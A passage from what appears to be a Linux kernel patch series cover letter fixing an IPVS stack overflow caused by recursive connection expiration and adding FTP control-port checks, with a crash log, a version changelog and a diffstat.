[   40.951167] PGD 6f1e067 P4D 6f1f067 PUD 6f20067 PMD 80000000114001e3 
[   40.951167] Thread overran stack, or stack corrupted
[   40.951167] Oops: Oops: 0011 [#1] SMP KASAN NOPTI
[   40.951167] CPU: 0 UID: 0 PID: 11 Comm: kworker/0:1 Tainted: G        W           7.3.0-rc2-g70194dc37670 #1 PREEMPT(lazy) 
[   40.951167] Tainted: [W]=WARN
[   40.951167] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   40.951167] Workqueue:  0x0 (events_freezable_pwr_efficient)

[   40.951167] Call Trace:
[   40.951167]  <TASK>
[   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
[   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
[   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
[   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
[   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
[   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
[   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
[   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
[   40.951167]  </TASK>

[   40.951167] Kernel panic - not syncing: Fatal exception
[   40.951167] Shutting down cpus with NMI
[   40.951167] Kernel Offset: disabled
[   40.951167] ---[ end Kernel panic - not syncing: Fatal exception ]---
-----END crash log-----

changes in v5:
  - Update the first patch with Julian Anastasov's v3 fix, restoring
    the reference with refcount_set(&cp->refcnt, 1).
  - v4 Link: https://lore.kernel.org/all/cover.1790146910.git.zihanx@nebusec.ai/
changes in v4:
  - Add Julian Anastasov's timer-callback deletion fix as patch 1,
    including n_control revalidation.
  - Rebase iterative controller cleanup on that fix and keep the
    controller walk synchronous without recursive expiration.
  - Resend the FTP helper checks as patch 3/3.
  - v3 Link: https://lore.kernel.org/all/cover.1789877273.git.zihanx@nebusec.ai/
changes in v3:
  - Add the active-mode guard for configured FTP control ports.
  - Handle the timer-callback race while keeping controller cleanup
    iterative and synchronous.
  - v2 Link: https://lore.kernel.org/all/cover.1789435989.git.zihanx@nebusec.ai/
changes in v2:
  - Replace recursive controller expiration with an iterative path.
  - Add the FTP-helper checks for configured control ports.
  - v1 Link: https://lore.kernel.org/all/cover.1789110326.git.zihanx@nebusec.ai/


Best regards,
Zihan Xi

Julian Anastasov (1):
  ipvs: wait the running timer cb on conn deletion

Zihan Xi (2):
  ipvs: avoid stack overflow from recursive connection expiration
  ipvs: reject FTP control ports as data ports

 net/netfilter/ipvs/ip_vs_conn.c | 117 ++++++++++++++++++--------------
 net/netfilter/ipvs/ip_vs_ftp.c  |  18 +++++
 2 files changed, 85 insertions(+), 50 deletions(-)

-- 
2.43.0

